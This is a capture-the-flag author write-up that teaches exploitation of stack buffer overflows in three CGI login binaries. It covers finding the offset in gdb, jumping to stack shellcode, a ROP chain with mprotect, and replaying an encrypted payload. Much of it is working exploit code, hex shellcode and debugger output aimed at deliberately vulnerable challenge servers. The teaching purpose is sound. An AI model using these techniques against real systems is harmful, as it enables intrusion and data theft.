The premise of the three challenges `cant-give-in`, `cant-give-in-secure`, and `cant-give-in-securer` are to learn how to exploit and debug compiled code that's loaded as a CGI module. You might think that's unlikely, but a surprising number of enterprise applications (usually hardware stuff - firewalls, network "security" appliances, stuff like that) is powered by CGI scripts. You never know!

**Repo link**

This challenge was inspired by one of my co-workers at GreyNoise asking how to debug a CGI script. I thought it'd be cool to make a multi-challenge series in case others didn't know!

This write-up is intended to be fairly detailed, to help new players understand their first stack overflow!

# Part 1: `cant-give-in`

## The vulnerability

First, let's look at the vuln! All three challenges have pretty similar vulnerabilities, but here's what the first looks like:

```c
char *strlength = getenv("CONTENT_LENGTH");
if(!strlength) {
  printf("ERROR: Please send data!");
  exit(0);
}

int length = atoi(strlength);
read(fileno(stdin), data, length);

if(!strcmp(data, "password=MyCoolPassword")) {
  printf("SUCCESS: authenticated successfully!");
} else {
  printf("ERROR: Login failed!");
}
```

The way CGI works - a fact that I'd forgotten since learning Perl like 20 years ago - is that the headers are processed by Apache and sent to the script as environmental variables, and the body (ie, POST data) is sent on stdin.

In that script, we read the `Content-Length` from a variable, then read that many bytes of the POST body into a static buffer. That's a fairly standard buffer overflow, with the twist that it's in a CGI application!

We can demonstrate the issue pretty easily by running the CGI directly (I'm using `dd` to produce 200 characters without cluttering up the screen):

```
$ dd if=/dev/urandom bs=1 count=200 | CONTENT_LENGTH=200 ./auth.cgi
Content-Type: text/plain

[...]
fish: Process 455756, './auth.cgi' from job 1, 'dd if=/dev/urandom bs=1 count=2…' terminated by signal SIGSEGV (Address boundary error)
```

## Getting the offset

There are a whole bunch of tools for this, but let's built it by hand!

We know that 200 bytes is enough to crash it. Since a memory address is 8 bytes on a 64-bit system, let's create a file that starts with 8 `A`s, 8 `B`s, etc. Do this however you like, but I like Ruby:

```
3.1.3 :007 > puts (?A..?Z).to_a.map { |c| c*8 }.join
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTTUUUUUUUUVVVVVVVVWWWWWWWWXXXXXXXXYYYYYYYYZZZZZZZZ

3.1.3 :008 > File.write('/tmp/poc.bin', (?A..?Z).to_a.map { |c| c*8 }.join)
 => 208
```

Then run the script in a debugger with that input:

```
$ CONTENT_LENGTH=208 gdb -q ./auth.cgi 
Reading symbols from ./auth.cgi...
(gdb) run < /tmp/poc.bin 
Starting program: /home/ron/projects/ctf/ctf-2024/challenges/cant-give-in/challenge/src/auth.cgi < /tmp/poc.bin
Content-Type: text/plain


Program received signal SIGSEGV, Segmentation fault.
0x000000000040175e in main (argc=1, argv=0x7fffffffdad8) at auth.c:32
```

Note that we set the `CONTENT_LENGTH` environmental variable before running the script, then run the binary with `run < /tmp/poc.bin`. The process crashes, so let's see where it crashes:

```
(gdb) x/i $rip
=> 0x40175e <main+265>: ret
```

Crashing at `ret` is what you'd expect if you overwrote the return address, so that's good news! We can inspect the value in `rsp` to see where it's trying to return to:

```
(gdb) x/xwg $rsp
0x7fffffffd918: 0x5656565656565656
```

Aha! 0x56 is `V`! We can do some math... or, better yet, just use Ruby some more:

```
3.1.3 :001 > puts (?A..?U).to_a.map { |c| c*8 }.join.length
168
```

So 168 bytes are needed before the return address! Let's verify that by creating a file with 168 `A`s followed by 8 `B`s. If it works, we'd expect to crash at `BBBBBBBB` (0x4242424242424242):

```
$ irb
3.1.3 :002 > File.write('/tmp/poc.bin', ('A'*168)+('B'*8))
 => 176
```

```
$ CONTENT_LENGTH=176 gdb -q ./auth.cgi
Reading symbols from ./auth.cgi...
(gdb) run < /tmp/poc.bin
Starting program: /home/ron/projects/ctf/ctf-2024/challenges/cant-give-in/challenge/src/auth.cgi < /tmp/poc.bin
Content-Type: text/plain


Program received signal SIGSEGV, Segmentation fault.
0x000000000040175e in main (argc=1, argv=0x7fffffffdad8) at auth.c:32
warning: Source file is more recent than executable.
32      }
(gdb) x/xwg $rsp
0x7fffffffd918: 0x4242424242424242
```

Aha! Now we know how to overwrite the return address. But what do we put there?

## Jumping to the stack

The first binary is compiled with all the fun flags:

```makefile
CFLAGS?=-Wall -fno-stack-protector -no-pie -z execstack -z norelro -static -g

all: auth.cgi

auth.cgi: auth.c
	gcc ${CFLAGS} -o auth.cgi auth.c

clean:
	rm -f *.o auth.cgi
```

Thanks to `-z execstack`, an exploit can run code straight from the stack! The easiest way to do that is to find a `jmp rsp` or `call rsp` gadget. I always forget the mnemonics, so I use a simple assembly script:

```asm
bits 64

call rsp
jmp rsp
```

That I assemble then disassemble:

```
$ nasm -o test.bin test.asm
$ ndisasm -b64 test.bin
00000000  FFD4              call rsp
00000002  FFE4              jmp rsp
```

I compiled the binary with `-static`, so there should be lots of options:

```
$ objdump -D auth.cgi | grep 'ff [ed]4'
  4127c9:       41 ff d4                call   *%r12
  439981:       41 ff d4                call   *%r12
  4476d9:       41 ff d4                call   *%r12
  460d77:       4c 8d 25 ff d4 02 00    lea    0x2d4ff(%rip),%r12        # 48e27d <_dl_out_of_memory+0x1d>
  478436:       41 ff d4                call   *%r12
  47910f:       ff e4                   jmp    *%rsp
[...]
```

I chose the first, which is actually at 0x4127ca since we want to skip over the 0x41. If we encode that in 64-bit little endian, it'll look like `"\x41\x27\xca\x00\x00\x00\x00\x00"` (since it's padded to 8 full bytes then the bytes are reversed - if you find endianness confusing, don't worry - I've been doing this forever and still managed to do it backwards while writing this blog!).

If we send the following payload:

```
<A>*168 + <address of call rsp> + <something...>
```

The `call rsp` will start executing the code found at `<something...>`! This won't work on anything even remotely modern or hardened, but we'll talk about that in part 2 when I disable the executable stack!

The assembly instruction `cc` means "debug breakpoint" or "trap" - importantly, we can immediately tell that it executed. So let's send this:

```
<A>*168 + <address of call rsp> + cc
```

Which looks like this (I'm breaking up the different parts for clarify):

```
3.1.3 :006 > File.write('/tmp/poc.bin', ('A'*168)+("\xca\x27\x41\x00\x00\x00\x00\x00")+("\xcc"))
 => 177
```

Then run it in a debugger, updating the `CONTENT_LENGTH` every time:

```
$ CONTENT_LENGTH=177 gdb -q ./auth.cgi
Reading symbols from ./auth.cgi...
(gdb) run < /tmp/poc.bin 
Starting program: /home/ron/projects/ctf/ctf-2024/challenges/cant-give-in/challenge/src/auth.cgi < /tmp/poc.bin
Content-Type: text/plain


Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffd921 in ?? ()
```

`SIGTRAP` is exactly what we want to see! We now have three steps yet: 1) create a flag file on our test machine, 2) replace `cc` with *any* other payload, and 3) run it against the web server!

## Weaponization

First, let's create a flag on our local machine so we don't confuse ourselves:

```
ron@ridcully ~ $ sudo mkdir -p /home/ctf/
ron@ridcully ~ $ echo 'CTF{my-fake-flag}' | sudo tee /home/ctf/flag.txt
CTF{my-fake-flag}
```

Now, what do we want to use for a payload? We can use `msfvenom` or whatever we want to generate an x64 payload, but in all honesty, that sounds like too much work. I ended up going [to my own blog](/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3) to a challenge from BSidesSF 2021 and grabbed the [solution file](https://github.com/BSidesSF/ctf-2021-release/blob/main/runme/solution/solution.bin). I didn't even have to change the path - the necessary code is identical.

Here's how we generate our new exploit using the `solution.bin` file from 2021:

```
3.1.3 :007 > File.write('/tmp/poc.bin', ('A'*168)+("\xca\x27\x41\x00\x00\x00\x00\x00")+File.read("/tmp/solution.bin"))
 => 263
```

Update our `CONTENT_LENGTH` and debug it again:

```
$ CONTENT_LENGTH=263 gdb -q ./auth.cgi
Reading symbols from ./auth.cgi...
(gdb) run < /tmp/poc.bin 
Starting program: /home/ron/projects/ctf/ctf-2024/challenges/cant-give-in/challenge/src/auth.cgi < /tmp/poc.bin
Content-Type: text/plain

CTF{my-fake-flag}
_[Inferior 1 (process 465655) exited normally]
```

And like magic, the exploit works (locally)! We can also use `strace` to watch the payload open, read, and write the data from the file, if we want (I like using this for troubleshooting):

```
$ CONTENT_LENGTH=263 strace ./auth.cgi < /tmp/poc.bin 
execve("./auth.cgi", ["./auth.cgi"], 0x7ffe603f3a50 /* 62 vars */) = 0

[...]

read(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"..., 263) = 263
open("/home/ctf/flag.txt", O_RDONLY)    = 3
read(3, "CTF{my-fake-flag}\n", 30)      = 18
write(1, "CTF{my-fake-flag}\n\0_\276\0\0\0\0\272\0\0\0\0", 30CTF{my-fake-flag}
_) = 30
exit(0)                                 = ?
+++ exited with 0 +++
```

Pretty cool!

## Final step

Finally, we need to send it against the server! I run the server with the given `Dockerfile`, forwarding port 8888:

```
ron@ridcully ~/ctf-2024/challenges/cant-give-in/challenge [challenge-cant-give-in]× $ docker build --progress=plain -t test . && docker run -p8888:80 --rm -it test
#0 building with "default" instance using docker driver

#1 [internal] load build definition from Dockerfile
#1 transferring dockerfile: 732B done
#1 DONE 0.0s

#2 [internal] load metadata for docker.io/library/httpd:2.4.58
#2 DONE 0.4s

...

#19 exporting to image
#19 exporting layers done
#19 writing image sha256:4e32fbd578f72b3faa13e0198e0b135366fc7be15cc267ec1d939e9f115364b2 done
#19 naming to docker.io/library/test done
#19 DONE 0.0s
AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.3. Set the 'ServerName' directive globally to suppress this message
AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.3. Set the 'ServerName' directive globally to suppress this message
[Fri Apr 12 21:16:31.011199 2024] [mpm_event:notice] [pid 7:tid 140256014165888] AH00489: Apache/2.4.58 (Unix) configured -- resuming normal operations
[Fri Apr 12 21:16:31.011419 2024] [core:notice] [pid 7:tid 140256014165888] AH00094: Command line: 'httpd -D FOREGROUND -c LoadModule cgid_module modules/mod_cgid.so'
```

Then send the same file as a POST body to the `/cgi-bin/auth.cgi` endpoint:

```
$ curl --data-binary @/tmp/poc.bin 'http://localhost:8888/cgi-bin/auth.cgi' --output -
CTF{certified-genuine-instruct
```

Our PoC from last year truncates it a bit, but you get the idea!

# Part 2: `cant-give-in-secure`

Other than the flag and pointless password, part 2 only has one small change, but boy is it a doozie:

```diff
$ diff -rub cant-give-in/challenge/ cant-give-in-secure/challenge/

[...]

diff '--color=auto' -rub cant-give-in/challenge/src/Makefile cant-give-in-secure/challenge/src/Makefile
--- cant-give-in/challenge/src/Makefile 2024-04-12 13:31:39.443488015 -0400
+++ cant-give-in-secure/challenge/src/Makefile  2024-04-12 13:31:39.408487713 -0400
@@ -1,4 +1,4 @@
-CFLAGS?=-Wall -fno-stack-protector -no-pie -z execstack -z norelro -static -g
+CFLAGS?=-Wall -fno-stack-protector -no-pie -static -g
 
 all: auth.cgi
```

The stack is no longer executable, which means we can't just run code from the stack anymore!

There are lots of different ways to work around this, but many of them are broken by the fact that it's a CGI application: when it's running as a CGI script, you don't have a "real" `stdin`, which means some tricks I like, like rewinding `stdin` with `fseek`, apparently didn't work. I didn't figure out why, I just looked for another solution.

What I ended up doing was using return-oriented programming (ROP) to:

* Find some unused-but-writable memory
* Write shellcode to that memory, 8 bytes at a time
* Use `mprotect` to make the memory executable
* Run the shellcode therein

Finding writable memory was pretty easy - I opened the binary in IDA, found the `.data` section (which is typically readable and writable), and found a big block of 0 bytes. There isn't really a wrong answer, but the address 0x4A6000 seemed perfectly reasonable.

## Write the shellcode to memory

To write shellcode to memory, I needed some sorta ROP gadget. There are tools for this sorta thing, but I'm too lazy to use the easy way, so I just searched for `ret` and pressed `next` until I found one I liked.

First, I used this block of code to set `rax` and `rdx` to arbitrary values (also `rbx`, but that didn't matter):

```
.text:00000000004696D6                 pop     rax
.text:00000000004696D7                 pop     rdx
.text:00000000004696D8                 pop     rbx
.text:00000000004696D9                 retn
```

Then this to write the value from `rax` to the memory pointed to by `rdx`:

```
.text:0000000000416E10                 mov     [rdx], rax
.text:0000000000416E13                 retn
```

Thank you, `do_dlopen()` and `_IO_remove_marker()`, for having great suffixes!

From those two blocks, I created this loop to break the shellcode into 8 bytes and write them to the writable memory at an offset (note that I padded the shellcode to make suer we didn't chop off the end when chunking it into 8 byte blocks):

```ruby

SHELLCODE = ["b802000000e8130000002f686f6d652f6374662f666c61672e747874005fbe00000000ba000000000f055750b8000000005f5eba240000000f05b801000000bf01000000ba240000000f05b83c000000bf000000000f05cccccccccccccccc"].pack('H*')

# Break our shellcode into 8-byte chunks
offset = 0
stack = ""
SHELLCODE.scan(/.{8}/) do |code|
  # For each chunk, do:
  # rax = <offset we want to write code to>
  # rdx = <current 8 bytes of shellcode>
  # rbx = indifferent value - it's just along for the ride
  stack += [
    POP_RAX_POP_RDX_POP_RBX_RET,
    code.unpack('q').pop,
    WRITEABLE_MEMORY + offset,
    0x5a5a5a5a5a5a5a5a,
    MOV_RAX_PTR_EDX_RET,
  ].pack('q*')
  offset += 8
end
```

Which looks something like:

```
004696d6
13e800000002b8
004a6000
5a5a5a5a5a5a5a5a
00416e10
004696d6
2f656d6f682f0000
004a6008
5a5a5a5a5a5a5a5a
00416e10
004696d6
67616c662f667463
004a6010
5a5a5a5a5a5a5a5a
...
```

## Call `mprotect`

Once that's done, we need to call `mprotect` to make the memory executable. We can either use the `mprotect` syscall (`rax` = 0x0a), or the `mprotect` function, which is actually just a thin wrapper for the syscall:

```
.text:0000000000439450 mprotect        proc near               ; CODE XREF: alloc_new_heap+A9↑p
.text:0000000000439450                                         ; sysmalloc+3CD↑p ...
.text:0000000000439450 ; __unwind {
.text:0000000000439450                 mov     eax, 0Ah
.text:0000000000439455                 syscall                 ; LINUX - sys_mprotect
.text:0000000000439457                 cmp     rax, 0FFFFFFFFFFFFF001h
.text:000000000043945D                 jnb     short loc_439460
.text:000000000043945F                 retn
.text:0000000000439460 ; ---------------------------------------------------------------------------
.text:0000000000439460
.text:0000000000439460 loc_439460:                             ; CODE XREF: mprotect+D↑j
.text:0000000000439460                 mov     rcx, 0FFFFFFFFFFFFFFB8h
.text:0000000000439467                 neg     eax
.text:0000000000439469                 mov     fs:[rcx], eax
.text:000000000043946C                 or      rax, 0FFFFFFFFFFFFFFFFh
.text:0000000000439470                 retn
.text:0000000000439470 ; } // starts at 439450
.text:0000000000439470 mprotect        endp
```

We may as well just use that!

The tricky part with exploiting a 64-bit application is that function calls no longer use the stack to pass arguments; the calling convention is [register-based](https://en.wikipedia.org/wiki/X86_calling_conventions#System_V_AMD64_ABI). Since `mprotect` requires 3 arguments, we need to find a way to set the first three registers: `rdi`, `rsi`, and `rdx`. I struggled to find a good way to set additional registers, which is why we didn't use `mmap`.

So, once again, I'm too lazy to do it the easy way so I just scoured the code for useful gadgets to set the registers. I ended up finding the following three gadgets...

`pop rdi / ret` (`5f c3`):

```
.text:0000000000401D8F 41 5F                             pop     r15 ; 5f = pop rdi
.text:0000000000401D91 C3                                retn
```

`pop rsi / ret` (`5e c3`):

```
.text:000000000040F781 41 5E                             pop     r14
.text:000000000040F783 C3                                retn
```

And `pop rdx / pop rbx / ret` (`5a 5b c3`), once again loading `rbx` with data it'll never use:

```
.text:00000000004696D7 5A                                pop     rdx
.text:00000000004696D8 5B                                pop     rbx
.text:00000000004696D9 C3                                retn
```

Using these three values, I could set up the call to `mprotect`:

```ruby
stack += [
  POP_RDI_RET,
  WRITEABLE_MEMORY,

  POP_RSI_RET,
  SHELLCODE.length,

  POP_RDX_POP_RBX_RET,
  PROTECT_READ_WRITE_EXEC,
  INDIFFERENT_VALUE, # Goes into ebx, don't care

  MPROTECT, # memprotect(WRITABLE_MEMORY, (length), +rwx)
].pack('q*')
```

Then finally, at the end, returning to the start of the shellcode that we just made executable:

```
stack += [
  # Return into the shellcode
  WRITEABLE_MEMORY,
].pack('q*')
```

## The exploit

Putting it all together, along with the shellcode from last question (possibly with the length changed) you get the exploit:

```
# Encoding: ascii-8bit

require './libronsolve'
require 'base64'
require 'httparty'

# Gadgets
POP_RDI_RET = 0x401D90 # 5fc3
POP_RSI_RET = 0x40F782 # 5ec3
POP_RDX_POP_RBX_RET = 0x4696D7 # 5a5bc3 - best I could find
POP_RAX_POP_RDX_POP_RBX_RET = 0x4696D6 # 585a5bc3
MOV_RAX_PTR_EDX_RET = 0x416E10 # 488902

# Random address in the data segment that we will write our shellcode to
# (this can be basically anywhere)
WRITEABLE_MEMORY = 0x4A6000

# Libc functions statically linked in
MPROTECT = 0x439450

# Debug breakpoint
DEBUG = 0x461F5F

# Argument to mprotect()
PROTECT_READ_WRITE_EXEC = 7

# Random value for padding
INDIFFERENT_VALUE = 0x5a5a5a5a5a5a5a5a

# Super inefficient "read file / write stdout" shellcode
SHELLCODE = ["b802000000e8130000002f686f6d652f6374662f666c61672e747874005fbe00000000ba000000000f055750b8000000005f5eba240000000f05b801000000bf01000000ba240000000f05b83c000000bf000000000f05cccccccccccccccc"].pack('H*')

# Break our shellcode into 8-byte chunks
offset = 0
stack = ""
SHELLCODE.scan(/.{8}/) do |code|
  # For each chunk, do:
  # rax = <offset we want to write code to>
  # rdx = <current 8 bytes of shellcode>
  # rbx = indifferent value - it's just along for the ride
  stack += [
    POP_RAX_POP_RDX_POP_RBX_RET,
    code.unpack('q').pop,
    WRITEABLE_MEMORY + offset,
    INDIFFERENT_VALUE,
    MOV_RAX_PTR_EDX_RET,
  ].pack('q*')
  offset += 8
end

# Once we're done writing shellcode, use mprotect() to make the memory +rwx
stack += [
  POP_RDI_RET,
  WRITEABLE_MEMORY,

  POP_RSI_RET,
  SHELLCODE.length,

  POP_RDX_POP_RBX_RET,
  PROTECT_READ_WRITE_EXEC,
  INDIFFERENT_VALUE,

  MPROTECT, # memprotect(WRITABLE_MEMORY, (length), +rwx)
].pack('q*')

# Finally, return into the shellcode (which has an exit at the end)
stack += [
  # Return into the shellcode
  WRITEABLE_MEMORY,
].pack('q*')

# Return address offset from the start of the buffer
PADDING = 168

# Exploit = the padding + our ROP stack
EXPLOIT = ("A" * PADDING) + stack

# File.write("/tmp/exploit.bin", EXPLOIT)
# system "CONTENT_LENGTH=#{EXPLOIT.length} gdb ../challenge/src/auth.cgi"
# exit

# Send the payload
HOST, PORT = get_host_port()
puts "Connecting to #{HOST}:#{PORT}..."
s = TCPSocket.new(HOST, PORT)
s.write(
  "GET /cgi-bin/auth.cgi HTTP/1.0\r\n" +
  "Content-Length: #{EXPLOIT.length}\r\n" +
  "\r\n" +
  "#{EXPLOIT}"
)

flag = s.read.split(/\n/).pop

check_flag(flag, terminate: true)
```

# Part 3: `cant-get-in-securer`

The only changes on `cant-get-in-securer` are:

1. The payload is now encrypted with [Salsa20](https://github.com/alexwebr/salsa20) - that's my friend Alex's totally-unmaintained codebase
2. I stripped symbols so it'd be harder to tell

The goal is to make players either reverse engineer the encryption, or, better, to use a debugger to capture the encrypted payload! The key/nonce are static, so if you catch one pair, you get everything you need.

I changed the exploit to write the payload to a file and print the length:

```ruby
EXPLOIT = ("A" * PADDING) + stack
File.write("/tmp/unencrypted.bin", EXPLOIT)
puts EXPLOIT.length
exit
```

It prints 680, which lets us use our debugger again:

```
$ CONTENT_LENGTH=680 gdb -q ./auth.cgi
Reading symbols from ./auth.cgi...
(No debugging symbols found in ./auth.cgi)
```

I put a breakpoint at the `strcmp()` function, which is after the encrypt happens:

```
(gdb) b *0x401F04 
Breakpoint 1 at 0x401f04
```

Run with the unencrypted payload (identical to part 2, except offsets are changed):

```
(gdb) run < /tmp/unencrypted.bin
Starting program: /home/ron/projects/ctf/ctf-2024/challenges/cant-give-in-securer/challenge/src/auth.cgi < /tmp/unencrypted.bin
Content-Type: text/plain
```

Write the encrypted payload to memory:
```
(gdb) dump memory /tmp/encrypted.bin $rdi $rdi+680
```

Then we can start the server and play it back:

```
$ curl -i --data-binary @/tmp/encrypted.bin 'http://localhost:8888/cgi-bin/auth.cgi' --output -
HTTP/1.1 200 OK
Date: Fri, 12 Apr 2024 22:02:05 GMT
Server: Apache/2.4.58 (Unix)
Transfer-Encoding: chunked
Content-Type: text/plain

CTF{cranky-gamified-indoctrination}
```

The cool part is, I never had to understand what was happening with the encryption code! Nothing better than lazy reversing :)

My exploit assumes that you know it's Salsa20, though. Other than the encryption, it's identical to the previous exploit:

```ruby
[ ... ]

EXPLOIT = Salsa20.new(key, iv).encrypt(("A" * PADDING) + stack)

[ ... ]
```

And that's that!
